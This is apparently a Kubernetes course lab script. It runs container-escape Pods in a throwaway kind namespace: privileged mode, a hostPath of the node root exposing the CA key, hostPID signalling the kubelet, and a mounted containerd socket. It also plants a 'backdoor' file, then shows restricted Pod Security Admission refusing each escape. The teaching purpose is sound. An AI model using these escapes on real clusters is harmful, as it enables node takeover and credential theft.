#!/usr/bin/env bash
# Lab 05.02: Pod security and container escape. Tier A (kind).
#
# Run this ONLY against a kind cluster you own, from any directory. It creates
# two throwaway namespaces (psa-lab permits everything, psa-restricted enforces
# `restricted`), runs container-escape attacks that reach the kind NODE, then
# shows the restricted namespace refusing every one of them at admission. It
# then runs the Bookstore's manifests through that same check and boots its
# data tier. It deletes everything it created at the end.
#
# Every escape stops at the kind node, which is itself a container: nothing
# here targets the machine that runs kind, and nothing touches another
# container. Host-kernel escapes are a tier-B topic, out of this chapter.
#
# The attack manifests are deliberately insecure and live only in psa-lab. Steps
# 10 and 11 use the `bookstore` namespace, so they are skipped on a cluster that
# already has one: tearing it down would take your Bookstore with it.
set +e

# busybox:1.36, pinned by digest (the image 01.01 uses).
BB=busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662

# Read a command from stdin, print it exactly as it runs, then run it.
run() { local cmd; cmd=$(cat); printf '$ %s\n' "$cmd"; eval "$cmd" 2>&1; echo; }

ctx=$(kubectl config current-context 2>/dev/null)
case "$ctx" in
  kind-*) ;;
  *) echo "refusing to run: kubectl context '$ctx' is not a kind cluster" >&2; exit 2 ;;
esac

guide=$(cd "$(dirname "$0")/../../.." && pwd) || exit 1   # full-guide/
work=$(mktemp -d) && cd "$work" || exit 1

bookstore_free=yes
if kubectl get ns bookstore >/dev/null 2>&1 ||
   kubectl get priorityclass bookstore-data >/dev/null 2>&1; then
  bookstore_free=no
fi

kubectl delete ns psa-lab psa-restricted --ignore-not-found --wait=true >/dev/null 2>&1

echo '## step 1: one namespace that permits everything, one that enforces restricted'
run <<'CMD'
kubectl create ns psa-lab
kubectl label ns psa-lab pod-security.kubernetes.io/enforce=privileged
CMD
run <<'CMD'
kubectl create ns psa-restricted
kubectl label ns psa-restricted \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted
CMD
# A Pod that names no ServiceAccount is refused until the controller has made
# the namespace's `default` one, so a scripted apply has to wait for it.
until kubectl get sa default -n psa-lab >/dev/null 2>&1; do sleep 1; done

echo '## step 2: privileged, compared with a plain Pod'
cat >esc-privileged.yaml <<YAML
apiVersion: v1
kind: Pod
metadata: {name: escape-privileged, namespace: psa-lab}
spec:
  containers:
    - name: esc
      image: $BB
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
YAML
cat >plain.yaml <<YAML
apiVersion: v1
kind: Pod
metadata: {name: plain, namespace: psa-lab}
spec:
  containers:
    - name: app
      image: $BB
      command: ["sleep", "3600"]
YAML
run <<'CMD'
kubectl apply -f esc-privileged.yaml -f plain.yaml
kubectl wait -n psa-lab --for=condition=Ready --timeout=90s pod/escape-privileged pod/plain
CMD
run <<'CMD'
kubectl exec -n psa-lab escape-privileged -- sh -c '
  grep -E "^Cap(Eff|Bnd)" /proc/self/status | tr -s "\t" " "
  cat /proc/sys/kernel/cap_last_cap'
CMD
run <<'CMD'
for p in escape-privileged plain; do
  echo "== $p =="
  kubectl exec -n psa-lab "$p" -- sh -c '
    echo "entries in /dev: $(ls /dev | wc -l)"
    mount -t tmpfs tmpfs /tmp && echo "mount: allowed" || true'
done
CMD

echo '## step 3: hostPath /, read the cluster CA key, and what root has to do with it'
cat >esc-hostpath.yaml <<YAML
apiVersion: v1
kind: Pod
metadata: {name: escape-hostpath, namespace: psa-lab}
spec:
  containers:
    - name: esc
      image: $BB
      command: ["sleep", "3600"]
      volumeMounts:
        - {name: nodefs, mountPath: /host, readOnly: true}
  volumes:
    - name: nodefs
      hostPath: {path: /, type: Directory}
YAML
cat >esc-hostpath-nocaps.yaml <<YAML
apiVersion: v1
kind: Pod
metadata: {name: escape-hostpath-nocaps, namespace: psa-lab}
spec:
  containers:
    - name: esc
      image: $BB
      command: ["sleep", "3600"]
      securityContext:
        capabilities: {drop: ["ALL"]}
      volumeMounts:
        - {name: nodefs, mountPath: /host, readOnly: true}
  volumes:
    - name: nodefs
      hostPath: {path: /, type: Directory}
YAML
cat >esc-hostpath-nonroot.yaml <<YAML
apiVersion: v1
kind: Pod
metadata: {name: escape-hostpath-nonroot, namespace: psa-lab}
spec:
  securityContext:
    runAsUser: 65532
  containers:
    - name: esc
      image: $BB
      command: ["sleep", "3600"]
      securityContext:
        capabilities: {drop: ["ALL"]}
      volumeMounts:
        - {name: nodefs, mountPath: /host, readOnly: true}
  volumes:
    - name: nodefs
      hostPath: {path: /, type: Directory}
YAML
run <<'CMD'
kubectl apply -f esc-hostpath.yaml -f esc-hostpath-nocaps.yaml -f esc-hostpath-nonroot.yaml
kubectl wait -n psa-lab --for=condition=Ready --timeout=90s \
  pod/escape-hostpath pod/escape-hostpath-nocaps pod/escape-hostpath-nonroot
CMD
# The key itself stays out of the transcript: only the first ten bytes print,
# which are the PEM armour and hold no key material.
run <<'CMD'
kubectl exec -n psa-lab escape-hostpath -- sh -c '
  cat /host/etc/hostname
  stat -c "%a %U %n" /host/etc/kubernetes/pki/ca.key
  head -c 10 /host/etc/kubernetes/pki/ca.key; echo'
CMD
run <<'CMD'
for p in escape-hostpath-nocaps escape-hostpath-nonroot; do
  echo "== $p =="
  kubectl exec -n psa-lab "$p" -- sh -c '
    id -u
    grep ^CapEff /proc/self/status | tr -s "\t" " "
    cat /host/etc/hostname
    head -c 10 /host/etc/kubernetes/pki/ca.key; echo'
done
CMD

echo '## step 4: hostPID, see and signal every process on the node'
cat >esc-hostpid.yaml <<YAML
apiVersion: v1
kind: Pod
metadata: {name: escape-hostpid, namespace: psa-lab}
spec:
  hostPID: true
  containers:
    - name: esc
      image: $BB
      command: ["sleep", "3600"]
YAML
run <<'CMD'
kubectl apply -f esc-hostpid.yaml
kubectl wait -n psa-lab --for=condition=Ready --timeout=90s pod/escape-hostpid
CMD
run <<'CMD'
kubectl exec -n psa-lab escape-hostpid -- sh -c '
  ps -o pid,comm | grep -E "kubelet|containerd$" | sed "s/^ *//"
  K=$(pidof kubelet)
  kill -0 "$K" && echo "kill -0 kubelet: allowed"
  tr "\0" " " < "/proc/$K/cmdline" | cut -c1-40'
CMD

echo '## step 5: a mounted runtime socket reaches every container on the node'
cat >esc-socket.yaml <<YAML
apiVersion: v1
kind: Pod
metadata: {name: escape-socket, namespace: psa-lab}
spec:
  containers:
    - name: esc
      image: $BB
      command: ["sleep", "3600"]
      volumeMounts:
        - {name: sock, mountPath: /run/containerd/containerd.sock}
        - {name: crictl, mountPath: /usr/local/bin/crictl, readOnly: true}
  volumes:
    - name: sock
      hostPath: {path: /run/containerd/containerd.sock, type: Socket}
    - name: crictl
      hostPath: {path: /usr/local/bin/crictl, type: File}
YAML
run <<'CMD'
kubectl apply -f esc-socket.yaml
kubectl wait -n psa-lab --for=condition=Ready --timeout=90s pod/escape-socket
CMD
run <<'CMD'
kubectl exec -n psa-lab escape-socket -- sh -c '
  R=unix:///run/containerd/containerd.sock
  echo "containers visible: $(crictl -r $R ps -q 2>/dev/null | wc -l)"
  crictl -r $R ps --name kube-apiserver -o table 2>/dev/null |
    grep -o "kube-apiserver-[a-z0-9-]*"'
CMD

echo '## step 6: no read-only root filesystem, drop a binary into the running container'
run <<'CMD'
kubectl exec -n psa-lab plain -- sh -c '
  printf "%s\n" "#!/bin/sh" "echo INJECTED" > /usr/bin/backdoor
  chmod +x /usr/bin/backdoor
  /usr/bin/backdoor'
CMD

echo '## step 7: user namespaces, and what happened on this host'
run <<'CMD'
kubectl exec -n psa-lab plain -- cat /proc/self/uid_map | awk '{$1=$1;print}'
CMD
cat >userns-on.yaml <<YAML
apiVersion: v1
kind: Pod
metadata: {name: userns-on, namespace: psa-lab}
spec:
  hostUsers: false
  containers:
    - name: app
      image: $BB
      command: ["sleep", "3600"]
YAML
run <<'CMD'
kubectl apply -f userns-on.yaml
kubectl wait -n psa-lab --for=condition=Ready --timeout=30s pod/userns-on
CMD
run <<'CMD'
kubectl get pod -n psa-lab userns-on
CMD
run <<'CMD'
kubectl get node -o jsonpath='{.items[0].status.nodeInfo.kernelVersion}{"\n"}'
CMD
run <<'CMD'
kubectl get events -n psa-lab --field-selector reason=FailedCreatePodSandBox \
  -o jsonpath='{range .items[*]}{.message}{"\n"}{end}' |
  sed 's/sandbox "[0-9a-f]*"/sandbox/' | tail -1
CMD

echo '## step 8: re-attack a restricted namespace, admission refuses every one'
run <<'CMD'
for a in privileged hostpath hostpid socket; do
  echo "== $a =="
  sed "s/psa-lab/psa-restricted/" "esc-$a.yaml" |
    kubectl apply --dry-run=server -f - 2>&1 | sed -n 1p
done
CMD

echo '## step 9: the hardened form carries the baseline and is admitted'
cat >hardened.yaml <<YAML
apiVersion: v1
kind: ServiceAccount
metadata: {name: hardened-sa, namespace: psa-restricted}
automountServiceAccountToken: false
---
apiVersion: v1
kind: Pod
metadata: {name: hardened, namespace: psa-restricted}
spec:
  serviceAccountName: hardened-sa
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 65532
    runAsGroup: 65532
    seccompProfile: {type: RuntimeDefault}
  containers:
    - name: app
      image: $BB
      command: ["sleep", "3600"]
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities: {drop: ["ALL"]}
      resources:
        requests: {cpu: 10m, memory: 16Mi}
        limits: {memory: 32Mi}
      volumeMounts:
        - {name: tmp, mountPath: /tmp}
  volumes:
    - {name: tmp, emptyDir: {}}
YAML
run <<'CMD'
kubectl apply -f hardened.yaml
kubectl wait -n psa-restricted --for=condition=Ready --timeout=90s pod/hardened
CMD
run <<'CMD'
kubectl exec -n psa-restricted hardened -- sh -c '
  exec 2>&1
  id
  grep -E "^(CapEff|NoNewPrivs|Seccomp):" /proc/self/status | tr -s "\t" " "
  printf x > /usr/bin/backdoor || true'
CMD

if [ "$bookstore_free" = yes ]; then
  cd "$guide" || exit 1

  echo '## step 10: every Bookstore workload manifest, server dry-run against restricted'
  run <<'CMD'
kubectl apply -f examples/bookstore/raw-manifests/00-namespace.yaml
kubectl apply -f examples/bookstore/raw-manifests/05-serviceaccounts-rbac.yaml
CMD
  run <<'CMD'
for f in $(grep -lE '^  namespace: bookstore' examples/bookstore/raw-manifests/*.yaml); do
  grep -qE '^kind: (Pod|Deployment|StatefulSet|DaemonSet|Job|CronJob)( |$)' "$f" &&
    kubectl apply --dry-run=server -f "$f"
done
CMD

  echo '## step 11: the data tier boots with a read-only root filesystem'
  run <<'CMD'
M=examples/bookstore/raw-manifests
kubectl apply -f $M/16-db-credentials.yaml -f $M/35-priorityclasses.yaml
kubectl apply -f $M/12-redis.yaml -f $M/13-rabbitmq.yaml -f $M/20-postgres-statefulset.yaml
kubectl rollout status -n bookstore deployment/redis --timeout=300s
kubectl rollout status -n bookstore deployment/rabbitmq --timeout=300s
kubectl rollout status -n bookstore statefulset/postgres --timeout=300s
CMD
  run <<'CMD'
M=examples/bookstore/raw-manifests
kubectl apply -f $M/21-db-migrate-job.yaml -f $M/22-cleanup-cronjob.yaml
kubectl wait -n bookstore --for=condition=complete --timeout=110s job/db-migrate
kubectl create job -n bookstore cleanup-lab --from=cronjob/cleanup
kubectl wait -n bookstore --for=condition=complete --timeout=110s job/cleanup-lab
kubectl logs -n bookstore job/db-migrate --tail=1
kubectl logs -n bookstore job/cleanup-lab --tail=1
CMD
  run <<'CMD'
for w in deployment/redis deployment/rabbitmq statefulset/postgres; do
  echo "== $w =="
  kubectl exec -n bookstore "$w" -- sh -c 'id; touch /usr/bin/backdoor || true'
done
CMD
else
  echo '## steps 10 and 11 skipped: this cluster already has a bookstore namespace or its PriorityClasses'
  echo
fi

echo '## step 12: tear down what the lab created'
run <<'CMD'
kubectl delete ns psa-lab psa-restricted --wait=true
CMD
if [ "$bookstore_free" = yes ]; then
  run <<'CMD'
kubectl delete ns bookstore --wait=true
kubectl delete -f examples/bookstore/raw-manifests/35-priorityclasses.yaml
CMD
fi
rm -rf "$work"
